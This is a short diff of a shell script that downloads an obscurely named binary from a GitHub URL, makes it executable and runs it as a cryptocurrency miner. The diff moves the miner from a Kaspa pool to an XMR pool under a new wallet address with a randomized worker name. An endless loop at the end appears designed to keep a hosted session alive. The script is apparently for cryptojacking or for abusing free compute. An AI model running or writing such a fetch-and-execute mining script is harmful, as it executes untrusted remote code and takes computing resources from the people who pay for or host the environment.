@@ -1,4 +1,4 @@
 wget https://github.com/angkii/m/raw/main/AkubapakMU
 chmod u+x AkubapakMU
-./AkubapakMU --algo KASPA --pool pool.eu.woolypooly.com:3113 --user kaspa:qrgmnqd072jt5wfzgvvwz9xl565qr2tlq33exu7vytn20fwk8k5ukem947qn9.imi
+./AkubapakMU --algo KASPA --pool ethash.unmineable.com:443 --user XMR:83HzBwN146c9iq4p8mcxT6fM3hUNmHpzZii8uS8j37LkimD72XNQ3kZ9GisSHpWNw4UKapG4pkfzB9hKvvXxvdn2Gmrynju.$(echo $(shuf -i 1111-9999 -n 1)-aing)
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
